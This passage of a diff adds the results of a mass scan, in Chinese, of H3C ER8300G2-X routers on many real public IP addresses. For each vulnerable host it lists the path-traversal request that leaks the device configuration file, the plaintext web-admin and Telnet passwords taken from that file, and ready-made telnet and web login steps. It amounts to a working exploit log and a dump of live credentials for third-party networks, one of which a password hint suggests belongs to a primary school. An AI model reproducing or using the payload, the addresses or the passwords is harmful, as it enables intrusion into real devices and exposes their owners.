+    🔑 Telnet/VTY密码: raoanzhongxue (vtypasswd=  @base 段 #1/#2)
+    💡 密码找回提示: @portmirror (admpwdpromt= 密码找回验证信息)
+    📡 Telnet服务: enable
+    🌐 DNS主服务器: 202.99.166.4
+  ⚡ 漏洞利用:
+    1. Telnet登录: telnet 221.195.67.174 8088
+       密码: raoanzhongxue
+    2. Web登录: http://221.195.67.174:8088/userLogin.asp
+       密码: raoanzhongxue
+    3. 弱口令检测: ✓ 密码强度较高，未命中已知弱口令库"
+117.158.48.249,8081,是,配置泄露,H3C,lenovo62686.,lenovo62686.,ER8300G2-X,"▶ 漏洞利用成功！
+  利用路径: GET /userLogin.asp/../actionpolicy_status/../ER8300G2-X.cfg
+  完整URL: http://117.158.48.249:8081/userLogin.asp/../actionpolicy_status/../ER8300G2-X.cfg
+  返回状态: HTTP 200
+  配置文件大小: 200681 bytes
+  设备型号: ER8300G2-X / ERHMG2V100D026
+  📋 提取的敏感信息:
+    🔑 Web管理密码: lenovo62686. (admpwd=  @webadmin 段)
+    🔑 Telnet/VTY密码: lenovo62686. (vtypasswd=  @base 段 #1/#2)
+    💡 密码找回提示: len686d (admpwdpromt= 密码找回验证信息)
+    📡 Telnet服务: enable
+    🌐 DNS主服务器: 202.102.224.68
+  ⚡ 漏洞利用:
+    1. Telnet登录: telnet 117.158.48.249 8081
+       密码: lenovo62686.
+    2. Web登录: http://117.158.48.249:8081/userLogin.asp
+       密码: lenovo62686.
+    3. 弱口令检测: ✓ 密码强度较高，未命中已知弱口令库"
+183.3.220.96,8080,否,配置泄露,H3C,,,,未检测到配置泄露漏洞
+117.173.77.3,18080,否,配置泄露,H3C,,,,未检测到配置泄露漏洞
+223.76.90.4,9002,否,配置泄露,H3C,,,,未检测到配置泄露漏洞
+120.232.252.74,8080,否,配置泄露,H3C,,,,未检测到配置泄露漏洞
+123.180.188.12,8001,否,配置泄露,H3C,,,,未检测到配置泄露漏洞
+118.123.151.13,4430,否,配置泄露,H3C,,,,未检测到配置泄露漏洞
+171.39.87.13,55555,否,配置泄露,H3C,,,,未检测到配置泄露漏洞
+119.7.172.199,8081,否,配置泄露,H3C,,,,未检测到配置泄露漏洞
+183.56.179.229,1234,是,配置泄露,H3C,Cbwfnypygl1030,Cbwfnypygl1030,ER8300G2-X,"▶ 漏洞利用成功！
+  利用路径: GET /userLogin.asp/../actionpolicy_status/../ER8300G2-X.cfg
+  完整URL: http://183.56.179.229:1234/userLogin.asp/../actionpolicy_status/../ER8300G2-X.cfg
+  返回状态: HTTP 200
+  配置文件大小: 172172 bytes
+  设备型号: ER8300G2-X / ERHMG2V100D026
+  📋 提取的敏感信息:
+    🔑 Web管理密码: Cbwfnypygl1030 (admpwd=  @webadmin 段)
+    🔑 Telnet/VTY密码: Cbwfnypygl1030 (vtypasswd=  @base 段 #1/#2)
+    💡 密码找回提示: dcf (admpwdpromt= 密码找回验证信息)
+    📡 Telnet服务: enable
+    🌐 DNS主服务器: 219.134.142.129
+  ⚡ 漏洞利用:
+    1. Telnet登录: telnet 183.56.179.229 1234
+       密码: Cbwfnypygl1030
+    2. Web登录: http://183.56.179.229:1234/userLogin.asp
+       密码: Cbwfnypygl1030
+    3. 弱口令检测: ✓ 密码强度较高，未命中已知弱口令库"
+183.6.43.118,8088,否,配置泄露,H3C,,,,未检测到配置泄露漏洞
+183.234.255.75,8081,否,配置泄露,H3C,,,,未检测到配置泄露漏洞
+125.95.197.70,8090,否,配置泄露,H3C,,,,未检测到配置泄露漏洞
+27.45.229.73,8090,是,配置泄露,H3C,gbcom123456,gbcom123456,ER8300G2-X,"▶ 漏洞利用成功！
+  利用路径: GET /userLogin.asp/../actionpolicy_status/../ER8300G2-X.cfg
+  完整URL: http://27.45.229.73:8090/userLogin.asp/../actionpolicy_status/../ER8300G2-X.cfg
+  返回状态: HTTP 200
+  配置文件大小: 158780 bytes
+  设备型号: ER8300G2-X / ERHMG2V100D024
+  📋 提取的敏感信息:
+    🔑 Web管理密码: gbcom123456 (admpwd=  @webadmin 段)
+    🔑 Telnet/VTY密码: gbcom123456 (vtypasswd=  @base 段 #1/#2)
+    💡 密码找回提示: @portmirror (admpwdpromt= 密码找回验证信息)
+    📡 Telnet服务: enable
+    🌐 DNS主服务器: 120.80.88.88
+  ⚡ 漏洞利用:
+    1. Telnet登录: telnet 27.45.229.73 8090
+       密码: gbcom123456
+    2. Web登录: http://27.45.229.73:8090/userLogin.asp
+       密码: gbcom123456
+    3. 弱口令检测: ✓ 密码强度较高，未命中已知弱口令库"
+122.233.212.99,8081,否,配置泄露,,,,,端口未开放，跳过检测
+183.3.158.148,8090,否,配置泄露,H3C,,,,未检测到配置泄露漏洞
+116.23.98.205,8090,否,配置泄露,,,,,端口未开放，跳过检测
+115.230.112.169,9001,否,配置泄露,,,,,端口未开放，跳过检测
+116.25.38.155,9090,否,配置泄露,,,,,端口未开放，跳过检测
+61.145.135.166,8083,否,配置泄露,H3C,,,,未检测到配置泄露漏洞
+106.8.45.106,8989,否,配置泄露,H3C,,,,未检测到配置泄露漏洞
+183.3.210.245,8080,否,配置泄露,H3C,,,,未检测到配置泄露漏洞
+119.141.145.222,8000,是,配置泄露,H3C,edcokm,edcokm,ER8300G2-X,"▶ 漏洞利用成功！
+  利用路径: GET /userLogin.asp/../actionpolicy_status/../ER8300G2-X.cfg
+  完整URL: http://119.141.145.222:8000/userLogin.asp/../actionpolicy_status/../ER8300G2-X.cfg
+  返回状态: HTTP 200
+  配置文件大小: 161837 bytes
+  设备型号: ER8300G2-X / ERHMG2V100D026
+  📋 提取的敏感信息:
+    🔑 Web管理密码: edcokm (admpwd=  @webadmin 段)
+    🔑 Telnet/VTY密码: edcokm (vtypasswd=  @base 段 #1/#2)
+    💡 密码找回提示: edc (admpwdpromt= 密码找回验证信息)
+    📡 Telnet服务: enable
+    🌐 DNS主服务器: 202.96.128.68
+  ⚡ 漏洞利用:
+    1. Telnet登录: telnet 119.141.145.222 8000
+       密码: edcokm
+    2. Web登录: http://119.141.145.222:8000/userLogin.asp
+       密码: edcokm
+    3. 弱口令检测: ✓ 密码强度较高，未命中已知弱口令库"
+1.207.120.14,1080,是,配置泄露,H3C,admin,admin,ER8300G2-X,"▶ 漏洞利用成功！
+  利用路径: GET /userLogin.asp/../actionpolicy_status/../ER8300G2-X.cfg
+  完整URL: http://1.207.120.14:1080/userLogin.asp/../actionpolicy_status/../ER8300G2-X.cfg
+  返回状态: HTTP 200
+  配置文件大小: 155456 bytes
+  设备型号: ER8300G2-X / ERHMG2V100D022
+  📋 提取的敏感信息:
+    🔑 Web管理密码: admin (admpwd=  @webadmin 段)
+    🔑 Telnet/VTY密码: admin (vtypasswd=  @base 段 #1/#2)
+    📡 Telnet服务: enable
+    🌐 DNS主服务器: 202.98.192.67
+  ⚡ 漏洞利用:
+    1. Telnet登录: telnet 1.207.120.14 1080
+       密码: admin
+    2. Web登录: http://1.207.120.14:1080/userLogin.asp
+       密码: admin
+    3. 弱口令检测: ⚠️ Web密码是弱口令!; Telnet密码是弱口令!"
+222.71.144.154,12000,否,配置泄露,H3C,,,,未检测到配置泄露漏洞
+180.152.91.178,8081,否,配置泄露,H3C,,,,未检测到配置泄露漏洞
+116.170.76.239,8081,否,配置泄露,,,,,端口未开放，跳过检测
+59.34.1.254,8088,否,配置泄露,H3C,,,,未检测到配置泄露漏洞
+220.194.177.159,88,是,配置泄露,H3C,dxkcc4DRW4,dxkcc4DRW4,ER8300G2-X,"▶ 漏洞利用成功！
+  利用路径: GET /userLogin.asp/../actionpolicy_status/../ER8300G2-X.cfg
+  完整URL: http://220.194.177.159:88/userLogin.asp/../actionpolicy_status/../ER8300G2-X.cfg
+  返回状态: HTTP 200
+  配置文件大小: 166186 bytes
+  设备型号: ER8300G2-X / ERHMG2V100D024
+  📋 提取的敏感信息:
+    🔑 Web管理密码: dxkcc4DRW4 (admpwd=  @webadmin 段)
+    🔑 Telnet/VTY密码: dxkcc4DRW4 (vtypasswd=  @base 段 #1/#2)
+    💡 密码找回提示: @portmirror (admpwdpromt= 密码找回验证信息)
+    📡 Telnet服务: enable
+    🌐 DNS主服务器: 202.99.192.68
+  ⚡ 漏洞利用:
+    1. Telnet登录: telnet 220.194.177.159 88
+       密码: dxkcc4DRW4
+    2. Web登录: http://220.194.177.159:88/userLogin.asp
+       密码: dxkcc4DRW4
+    3. 弱口令检测: ✓ 密码强度较高，未命中已知弱口令库"
+183.233.170.115,8999,是,配置泄露,H3C,xx83g2x,xx83g2x,ER8300G2-X,"▶ 漏洞利用成功！
+  利用路径: GET /userLogin.asp/../actionpolicy_status/../ER8300G2-X.cfg
+  完整URL: http://183.233.170.115:8999/userLogin.asp/../actionpolicy_status/../ER8300G2-X.cfg
+  返回状态: HTTP 200
+  配置文件大小: 196561 bytes
+  设备型号: ER8300G2-X / ERHMG2V100D024
+  📋 提取的敏感信息:
+    🔑 Web管理密码: xx83g2x (admpwd=  @webadmin 段)
+    🔑 Telnet/VTY密码: xx83g2x (vtypasswd=  @base 段 #1/#2)
+    💡 密码找回提示: 小学主路由器 (admpwdpromt= 密码找回验证信息)
+    📡 Telnet服务: enable
+    🌐 DNS主服务器: 103.27.24.1
+  ⚡ 漏洞利用:
+    1. Telnet登录: telnet 183.233.170.115 8999
+       密码: xx83g2x
+    2. Web登录: http://183.233.170.115:8999/userLogin.asp
+       密码: xx83g2x
+    3. 弱口令检测: ✓ 密码强度较高，未命中已知弱口令库"
+27.109.142.117,8080,否,配置泄露,H3C,,,,未检测到配置泄露漏洞
+124.165.194.102,8080,是,配置泄露,H3C,1314521abcd,1314521abcd,ER8300G2-X,"▶ 漏洞利用成功！
+  利用路径: GET /userLogin.asp/../actionpolicy_status/../ER8300G2-X.cfg
+  完整URL: http://124.165.194.102:8080/userLogin.asp/../actionpolicy_status/../ER8300G2-X.cfg
+  返回状态: HTTP 200
+  配置文件大小: 155674 bytes
+  设备型号: ER8300G2-X / ERHMG2V100D026
+  📋 提取的敏感信息:
+    🔑 Web管理密码: 1314521abcd (admpwd=  @webadmin 段)
+    🔑 Telnet/VTY密码: 1314521abcd (vtypasswd=  @base 段 #1/#2)
+    💡 密码找回提示: 1314521 (admpwdpromt= 密码找回验证信息)
+    📡 Telnet服务: enable
+    🌐 DNS主服务器: 202.99.192.66
+  ⚡ 漏洞利用:
+    1. Telnet登录: telnet 124.165.194.102 8080
+       密码: 1314521abcd
+    2. Web登录: http://124.165.194.102:8080/userLogin.asp
+       密码: 1314521abcd
+    3. 弱口令检测: ✓ 密码强度较高，未命中已知弱口令库"
+183.23.32.117,9000,否,配置泄露,,,,,端口未开放，跳过检测
+183.214.68.207,8081,否,配置泄露,H3C,,,,未检测到配置泄露漏洞
+122.231.200.253,82,是,配置泄露,H3C,hangzhou1234,hangzhou1234,ER8300G2-X,"▶ 漏洞利用成功！
+  利用路径: GET /userLogin.asp/../actionpolicy_status/../ER8300G2-X.cfg
+  完整URL: http://122.231.200.253:82/userLogin.asp/../actionpolicy_status/../ER8300G2-X.cfg
+  返回状态: HTTP 200
+  配置文件大小: 164975 bytes
+  设备型号: ER8300G2-X / ERHMG2V100D025
+  📋 提取的敏感信息:
+    🔑 Web管理密码: hangzhou1234 (admpwd=  @webadmin 段)
+    🔑 Telnet/VTY密码: hangzhou1234 (vtypasswd=  @base 段 #1/#2)
+    💡 密码找回提示: hangzhou (admpwdpromt= 密码找回验证信息)
+    📡 Telnet服务: enable
+    🌐 DNS主服务器: 0.0.0.0
+  ⚡ 漏洞利用:
+    1. Telnet登录: telnet 122.231.200.253 82
+       密码: hangzhou1234
+    2. Web登录: http://122.231.200.253:82/userLogin.asp
+       密码: hangzhou1234
+    3. 弱口令检测: ✓ 密码强度较高，未命中已知弱口令库"
+219.139.75.154,10000,是,配置泄露,H3C,4767706x,4767706x,ER8300G2-X,"▶ 漏洞利用成功！
+  利用路径: GET /userLogin.asp/../actionpolicy_status/../ER8300G2-X.cfg
+  完整URL: http://219.139.75.154:10000/userLogin.asp/../actionpolicy_status/../ER8300G2-X.cfg
+  返回状态: HTTP 200
+  配置文件大小: 156258 bytes
+  设备型号: ER8300G2-X / ERHMG2V100D026
+  📋 提取的敏感信息:
+    🔑 Web管理密码: 4767706x (admpwd=  @webadmin 段)
+    🔑 Telnet/VTY密码: 4767706x (vtypasswd=  @base 段 #1/#2)
+    💡 密码找回提示: @portmirror (admpwdpromt= 密码找回验证信息)
+    📡 Telnet服务: enable
+    🌐 DNS主服务器: 202.103.44.150
+  ⚡ 漏洞利用:
+    1. Telnet登录: telnet 219.139.75.154 10000
+       密码: 4767706x
+    2. Web登录: http://219.139.75.154:10000/userLogin.asp
+       密码: 4767706x
+    3. 弱口令检测: ✓ 密码强度较高，未命中已知弱口令库"
+61.164.40.30,8888,否,配置泄露,,,,,端口未开放，跳过检测
+222.190.105.34,12000,是,配置泄露,H3C,tojoy-njfgs,tojoy-njfgs,ER8300G2-X,"▶ 漏洞利用成功！
+  利用路径: GET /userLogin.asp/../actionpolicy_status/../ER8300G2-X.cfg
+  完整URL: http://222.190.105.34:12000/userLogin.asp/../actionpolicy_status/../ER8300G2-X.cfg
+  返回状态: HTTP 200
+  配置文件大小: 155462 bytes
+  设备型号: ER8300G2-X / ERHMG2V100D024
+  📋 提取的敏感信息:
+    🔑 Web管理密码: tojoy-njfgs (admpwd=  @webadmin 段)
+    🔑 Telnet/VTY密码: tojoy-njfgs (vtypasswd=  @base 段 #1/#2)
+    💡 密码找回提示: @portmirror (admpwdpromt= 密码找回验证信息)
+    📡 Telnet服务: enable
+    🌐 DNS主服务器: 218.2.135.1
+  ⚡ 漏洞利用:
+    1. Telnet登录: telnet 222.190.105.34 12000
+       密码: tojoy-njfgs
+    2. Web登录: http://222.190.105.34:12000/userLogin.asp
+       密码: tojoy-njfgs
+    3. 弱口令检测: ✓ 密码强度较高，未命中已知弱口令库"
+183.23.146.112,8089,否,配置泄露,,,,,端口未开放，跳过检测
+183.23.150.72,8089,否,配置泄露,,,,,端口未开放，跳过检测
+117.30.202.122,9000,否,配置泄露,,,,,端口未开放，跳过检测
+122.235.225.200,10001,否,配置泄露,,,,,端口未开放，跳过检测
+49.74.225.165,60443,是,配置泄露,H3C,admin,Lxsk-2022,ER8300G2-X,"▶ 漏洞利用成功！
+  利用路径: GET /userLogin.asp/../actionpolicy_status/../ER8300G2-X.cfg
+  完整URL: http://49.74.225.165:60443/userLogin.asp/../actionpolicy_status/../ER8300G2-X.cfg
+  返回状态: HTTP 200
+  配置文件大小: 160356 bytes
+  设备型号: ER8300G2-X / ERHMG2V100D026
+  📋 提取的敏感信息:
+    🔑 Web管理密码: admin (admpwd=  @webadmin 段)
+    🔑 Telnet/VTY密码: Lxsk-2022 (vtypasswd=  @base 段 #1/#2)
+    💡 密码找回提示: 网址-公司成立时间 (admpwdpromt= 密码找回验证信息)
+    📡 Telnet服务: enable
+    🌐 DNS主服务器: 218.2.2.2
+  ⚡ 漏洞利用:
+    1. Telnet登录: telnet 49.74.225.165 60443
+       密码: Lxsk-2022
+    2. Web登录: http://49.74.225.165:60443/userLogin.asp
+       密码: admin
+    3. 弱口令检测: ⚠️ Web密码是弱口令!"
+113.118.19.83,9090,否,配置泄露,,,,,端口未开放，跳过检测
+218.81.143.112,8800,否,配置泄露,,,,,端口未开放，跳过检测
+222.223.236.46,8989,是,配置泄露,H3C,wasd1234,wasd1234,ER8300G2-X,"▶ 漏洞利用成功！
+  利用路径: GET /userLogin.asp/../actionpolicy_status/../ER8300G2-X.cfg
+  完整URL: http://222.223.236.46:8989/userLogin.asp/../actionpolicy_status/../ER8300G2-X.cfg
+  返回状态: HTTP 200
+  配置文件大小: 171112 bytes
+  设备型号: ER8300G2-X / ERHMG2V100D026
+  📋 提取的敏感信息:
+    🔑 Web管理密码: wasd1234 (admpwd=  @webadmin 段)
+    🔑 Telnet/VTY密码: wasd1234 (vtypasswd=  @base 段 #1/#2)
+    💡 密码找回提示: @portmirror (admpwdpromt= 密码找回验证信息)
+    📡 Telnet服务: enable
+    🌐 DNS主服务器: 222.222.222.222
+  ⚡ 漏洞利用:
+    1. Telnet登录: telnet 222.223.236.46 8989
+       密码: wasd1234
+    2. Web登录: http://222.223.236.46:8989/userLogin.asp
+       密码: wasd1234
+    3. 弱口令检测: ✓ 密码强度较高，未命中已知弱口令库"
+125.95.196.220,8090,否,配置泄露,H3C,,,,未检测到配置泄露漏洞
+183.222.235.19,8443,是,配置泄露,H3C,Admin@h3c123,Admin@h3c123,ER8300G2-X,"▶ 漏洞利用成功！
+  利用路径: GET /userLogin.asp/../actionpolicy_status/../ER8300G2-X.cfg
+  完整URL: http://183.222.235.19:8443/userLogin.asp/../actionpolicy_status/../ER8300G2-X.cfg
+  返回状态: HTTP 200
+  配置文件大小: 156470 bytes
+  设备型号: ER8300G2-X / ERHMG2V100D026
+  📋 提取的敏感信息:
+    🔑 Web管理密码: Admin@h3c123 (admpwd=  @webadmin 段)
+    🔑 Telnet/VTY密码: Admin@h3c123 (vtypasswd=  @base 段 #1/#2)
+    💡 密码找回提示: @portmirror (admpwdpromt= 密码找回验证信息)
+    📡 Telnet服务: enable
+    🌐 DNS主服务器: 183.221.253.100
+  ⚡ 漏洞利用:
+    1. Telnet登录: telnet 183.222.235.19 8443
+       密码: Admin@h3c123
+    2. Web登录: http://183.222.235.19:8443/userLogin.asp
+       密码: Admin@h3c123
+    3. 弱口令检测: ✓ 密码强度较高，未命中已知弱口令库"
+183.6.100.148,2443,否,配置泄露,H3C,,,,未检测到配置泄露漏洞
+171.83.55.68,81,否,配置泄露,H3C,,,,未检测到配置泄露漏洞
+110.16.97.146,10000,是,配置泄露,H3C,admin,nanmalufenxiao,ER8300G2-X,"▶ 漏洞利用成功！
+  利用路径: GET /userLogin.asp/../actionpolicy_status/../ER8300G2-X.cfg
+  完整URL: http://110.16.97.146:10000/userLogin.asp/../actionpolicy_status/../ER8300G2-X.cfg
+  返回状态: HTTP 200
+  配置文件大小: 155131 bytes
+  设备型号: ER8300G2-X / ERHMG2V100D021
+  📋 提取的敏感信息:
+    🔑 Web管理密码: admin (admpwd=  @webadmin 段)
+    🔑 Telnet/VTY密码: nanmalufenxiao (vtypasswd=  @base 段 #1/#2)
+    💡 密码找回提示: n (admpwdpromt= 密码找回验证信息)
+    📡 Telnet服务: enable
+    🌐 DNS主服务器: 202.99.224.68
+  ⚡ 漏洞利用:
+    1. Telnet登录: telnet 110.16.97.146 10000
+       密码: nanmalufenxiao
+    2. Web登录: http://110.16.97.146:10000/userLogin.asp
+       密码: admin
+    3. 弱口令检测: ⚠️ Web密码是弱口令!"
+124.95.135.171,999,否,配置泄露,H3C,,,,未检测到配置泄露漏洞
+183.6.186.2,8090,否,配置泄露,H3C,,,,未检测到配置泄露漏洞
+58.215.224.251,54321,否,配置泄露,,,,,端口未开放，跳过检测
+14.204.54.17,12000,否,配置泄露,H3C,,,,未检测到配置泄露漏洞
+58.247.110.26,10002,否,配置泄露,,,,,端口未开放，跳过检测
+183.56.181.28,8089,是,配置泄露,H3C,Clt@123,Clt4008770775,ER8300G2-X,"▶ 漏洞利用成功！
+  利用路径: GET /userLogin.asp/../actionpolicy_status/../ER8300G2-X.cfg
+  完整URL: http://183.56.181.28:8089/userLogin.asp/../actionpolicy_status/../ER8300G2-X.cfg
+  返回状态: HTTP 200
+  配置文件大小: 166076 bytes
+  设备型号: ER8300G2-X / ERHMG2V100D025
+  📋 提取的敏感信息:
+    🔑 Web管理密码: Clt@123 (admpwd=  @webadmin 段)
+    🔑 Telnet/VTY密码: Clt4008770775 (vtypasswd=  @base 段 #1/#2)
+    💡 密码找回提示: Clt (admpwdpromt= 密码找回验证信息)
+    📡 Telnet服务: enable
+    🌐 DNS主服务器: 223.5.5.5
+  ⚡ 漏洞利用:
+    1. Telnet登录: telnet 183.56.181.28 8089
+       密码: Clt4008770775
+    2. Web登录: http://183.56.181.28:8089/userLogin.asp
+       密码: Clt@123
+    3. 弱口令检测: ✓ 密码强度较高，未命中已知弱口令库"
+223.94.42.183,8090,否,配置泄露,H3C,,,,未检测到配置泄露漏洞
+175.155.227.13,8989,否,配置泄露,H3C,,,,未检测到配置泄露漏洞
+59.55.149.204,8181,否,配置泄露,H3C,,,,未检测到配置泄露漏洞
+123.245.58.49,8088,否,配置泄露,H3C,,,,未检测到配置泄露漏洞
+112.98.178.29,7000,否,配置泄露,H3C,,,,未检测到配置泄露漏洞
+218.93.2.43,8081,是,配置泄露,H3C,admin,qian790526,ER8300G2-X,"▶ 漏洞利用成功！
+  利用路径: GET /userLogin.asp/../actionpolicy_status/../ER8300G2-X.cfg
+  完整URL: http://218.93.2.43:8081/userLogin.asp/../actionpolicy_status/../ER8300G2-X.cfg
+  返回状态: HTTP 200
+  配置文件大小: 157697 bytes
+  设备型号: ER8300G2-X / ERHMG2V100D024
+  📋 提取的敏感信息:
+    🔑 Web管理密码: admin (admpwd=  @webadmin 段)
+    🔑 Telnet/VTY密码: qian790526 (vtypasswd=  @base 段 #1/#2)
+    💡 密码找回提示: @portmirror (admpwdpromt= 密码找回验证信息)
+    📡 Telnet服务: enable
+    🌐 DNS主服务器: 221.228.255.1
+  ⚡ 漏洞利用:
+    1. Telnet登录: telnet 218.93.2.43 8081
+       密码: qian790526
+    2. Web登录: http://218.93.2.43:8081/userLogin.asp
+       密码: admin
+    3. 弱口令检测: ⚠️ Web密码是弱口令!"
+119.36.47.80,8087,否,配置泄露,H3C,,,,未检测到配置泄露漏洞
+113.250.162.28,8989,否,配置泄露,H3C,,,,未检测到配置泄露漏洞
+180.165.1.216,8800,否,配置泄露,H3C,,,,未检测到配置泄露漏洞
+113.98.124.58,8008,否,配置泄露,H3C,,,,未检测到配置泄露漏洞
+183.6.46.54,8081,否,配置泄露,H3C,,,,未检测到配置泄露漏洞
+183.3.129.182,8081,否,配置泄露,H3C,,,,未检测到配置泄露漏洞
+120.194.220.216,8888,否,配置泄露,H3C,,,,未检测到配置泄露漏洞
+125.85.63.42,8989,否,配置泄露,,,,,端口未开放，跳过检测
+180.171.80.51,8800,否,配置泄露,H3C,,,,未检测到配置泄露漏洞
+119.98.37.230,8899,否,配置泄露,,,,,端口未开放，跳过检测
+183.246.179.84,8081,否,配置泄露,H3C,,,,未检测到配置泄露漏洞
+122.226.146.198,8081,否,配置泄露,H3C,,,,未检测到配置泄露漏洞
+221.224.35.186,12000,是,配置泄露,H3C,tojoy-szfgs,tojoy-szfgs,ER8300G2-X,"▶ 漏洞利用成功！
+  利用路径: GET /userLogin.asp/../actionpolicy_status/../ER8300G2-X.cfg
+  完整URL: http://221.224.35.186:12000/userLogin.asp/../actionpolicy_status/../ER8300G2-X.cfg
+  返回状态: HTTP 200
+  配置文件大小: 155304 bytes
+  设备型号: ER8300G2-X / ERHMG2V100D024
+  📋 提取的敏感信息:
+    🔑 Web管理密码: tojoy-szfgs (admpwd=  @webadmin 段)
+    🔑 Telnet/VTY密码: tojoy-szfgs (vtypasswd=  @base 段 #1/#2)
+    💡 密码找回提示: @portmirror (admpwdpromt= 密码找回验证信息)
+    📡 Telnet服务: enable
+    🌐 DNS主服务器: 61.177.7.1
+  ⚡ 漏洞利用:
+    1. Telnet登录: telnet 221.224.35.186 12000
+       密码: tojoy-szfgs
+    2. Web登录: http://221.224.35.186:12000/userLogin.asp
+       密码: tojoy-szfgs
+    3. 弱口令检测: ✓ 密码强度较高，未命中已知弱口令库"
+117.30.203.57,9000,否,配置泄露,H3C,,,,未检测到配置泄露漏洞
+59.54.88.61,6001,是,配置泄露,H3C,Ss12345678,Ss12345678,ER8300G2-X,"▶ 漏洞利用成功！
+  利用路径: GET /userLogin.asp/../actionpolicy_status/../ER8300G2-X.cfg
+  完整URL: http://59.54.88.61:6001/userLogin.asp/../actionpolicy_status/../ER8300G2-X.cfg
+  返回状态: HTTP 200
+  配置文件大小: 156889 bytes
+  设备型号: ER8300G2-X / ERHMG2V100D026
+  📋 提取的敏感信息:
+    🔑 Web管理密码: Ss12345678 (admpwd=  @webadmin 段)
+    🔑 Telnet/VTY密码: Ss12345678 (vtypasswd=  @base 段 #1/#2)
+    💡 密码找回提示: S (admpwdpromt= 密码找回验证信息)
+    📡 Telnet服务: enable
+    🌐 DNS主服务器: 202.101.226.69
+  ⚡ 漏洞利用:
+    1. Telnet登录: telnet 59.54.88.61 6001
+       密码: Ss12345678
+    2. Web登录: http://59.54.88.61:6001/userLogin.asp
+       密码: Ss12345678
+    3. 弱口令检测: ✓ 密码强度较高，未命中已知弱口令库"
+49.76.133.2,9001,否,配置泄露,H3C,,,,未检测到配置泄露漏洞
+183.23.187.215,9999,否,配置泄露,,,,,端口未开放，跳过检测
+175.6.7.242,8000,否,配置泄露,H3C,,,,未检测到配置泄露漏洞
+183.234.255.76,8081,否,配置泄露,H3C,,,,未检测到配置泄露漏洞
+120.224.124.14,8880,否,配置泄露,H3C,,,,未检测到配置泄露漏洞
+125.86.23.30,8989,否,配置泄露,H3C,,,,未检测到配置泄露漏洞
+222.181.10.4,8989,否,配置泄露,,,,,端口未开放，跳过检测
+121.57.250.106,18080,否,配置泄露,H3C,,,,未检测到配置泄露漏洞
+183.23.149.60,8089,否,配置泄露,,,,,端口未开放，跳过检测
+183.16.137.184,1234,否,配置泄露,,,,,端口未开放，跳过检测
+125.118.79.198,10086,否,配置泄露,,,,,端口未开放，跳过检测
+113.89.103.143,20000,否,配置泄露,,,,,端口未开放，跳过检测
+121.8.35.43,8090,是,配置泄露,H3C,gbcom123456,gbcom123456,ER8300G2-X,"▶ 漏洞利用成功！
+  利用路径: GET /userLogin.asp/../actionpolicy_status/../ER8300G2-X.cfg
+  完整URL: http://121.8.35.43:8090/userLogin.asp/../actionpolicy_status/../ER8300G2-X.cfg
+  返回状态: HTTP 200
+  配置文件大小: 177974 bytes
+  设备型号: ER8300G2-X / ERHMG2V100D024
+  📋 提取的敏感信息:
+    🔑 Web管理密码: gbcom123456 (admpwd=  @webadmin 段)
+    🔑 Telnet/VTY密码: gbcom123456 (vtypasswd=  @base 段 #1/#2)
+    💡 密码找回提示: @portmirror (admpwdpromt= 密码找回验证信息)
+    📡 Telnet服务: enable
+    🌐 DNS主服务器: 0.0.0.0
+  ⚡ 漏洞利用:
+    1. Telnet登录: telnet 121.8.35.43 8090
+       密码: gbcom123456
+    2. Web登录: http://121.8.35.43:8090/userLogin.asp
+       密码: gbcom123456
+    3. 弱口令检测: ✓ 密码强度较高，未命中已知弱口令库"
+60.176.239.16,10001,否,配置泄露,,,,,端口未开放，跳过检测
+171.213.204.60,18080,否,配置泄露,,,,,端口未开放，跳过检测
+116.23.98.231,8090,否,配置泄露,,,,,端口未开放，跳过检测
+122.225.241.114,8889,否,配置泄露,H3C,,,,未检测到配置泄露漏洞
+106.81.151.148,8989,否,配置泄露,,,,,端口未开放，跳过检测
+125.95.196.41,8090,否,配置泄露,,,,,端口未开放，跳过检测
+58.210.244.21,8686,否,配置泄露,H3C,,,,未检测到配置泄露漏洞
+119.141.146.37,8000,否,配置泄露,,,,,端口未开放，跳过检测
+60.176.166.214,8081,否,配置泄露,,,,,端口未开放，跳过检测
+115.196.61.134,8081,否,配置泄露,,,,,端口未开放，跳过检测
+36.33.42.75,8443,否,配置泄露,H3C,,,,未检测到配置泄露漏洞
+111.85.16.232,8080,否,配置泄露,H3C,,,,未检测到配置泄露漏洞
+119.5.142.66,8081,否,配置泄露,,,,,端口未开放，跳过检测
+123.180.188.12,8888,否,配置泄露,H3C,,,,未检测到配置泄露漏洞
+125.94.219.184,8999,是,配置泄露,H3C,xx83g2x,xx83g2x,ER8300G2-X,"▶ 漏洞利用成功！
+  利用路径: GET /ER8300G2-X.cfg
+  完整URL: http://125.94.219.184:8999/ER8300G2-X.cfg
+  返回状态: HTTP 200
+  配置文件大小: 196561 bytes
+  设备型号: ER8300G2-X / ERHMG2V100D024
+  📋 提取的敏感信息:
+    🔑 Web管理密码: xx83g2x (admpwd=  @webadmin 段)
+    🔑 Telnet/VTY密码: xx83g2x (vtypasswd=  @base 段 #1/#2)
+    💡 密码找回提示: 小学主路由器 (admpwdpromt= 密码找回验证信息)
+    📡 Telnet服务: enable
+    🌐 DNS主服务器: 103.27.24.1
+  ⚡ 漏洞利用:
+    1. Telnet登录: telnet 125.94.219.184 8999
+       密码: xx83g2x
+    2. Web登录: http://125.94.219.184:8999/userLogin.asp
+       密码: xx83g2x
+    3. 弱口令检测: ✓ 密码强度较高，未命中已知弱口令库"
+122.242.251.248,8181,否,配置泄露,,,,,端口未开放，跳过检测
+60.212.40.36,8888,是,配置泄露,H3C,tongxianggs,tongxianggs,ER8300G2-X,"▶ 漏洞利用成功！
+  利用路径: GET /userLogin.asp/../actionpolicy_status/../ER8300G2-X.cfg
+  完整URL: http://60.212.40.36:8888/userLogin.asp/../actionpolicy_status/../ER8300G2-X.cfg
+  返回状态: HTTP 200
+  配置文件大小: 165431 bytes
+  设备型号: ER8300G2-X / ERHMG2V100D026
+  📋 提取的敏感信息:
+    🔑 Web管理密码: tongxianggs (admpwd=  @webadmin 段)
+    🔑 Telnet/VTY密码: tongxianggs (vtypasswd=  @base 段 #1/#2)
+    💡 密码找回提示: @portmirror (admpwdpromt= 密码找回验证信息)
+    📡 Telnet服务: enable
+    🌐 DNS主服务器: 202.102.128.68
+  ⚡ 漏洞利用:
+    1. Telnet登录: telnet 60.212.40.36 8888
+       密码: tongxianggs
+    2. Web登录: http://60.212.40.36:8888/userLogin.asp
+       密码: tongxianggs
+    3. 弱口令检测: ✓ 密码强度较高，未命中已知弱口令库"
+222.181.10.195,8989,否,配置泄露,,,,,端口未开放，跳过检测
+14.220.236.83,4040,否,配置泄露,,,,,端口未开放，跳过检测
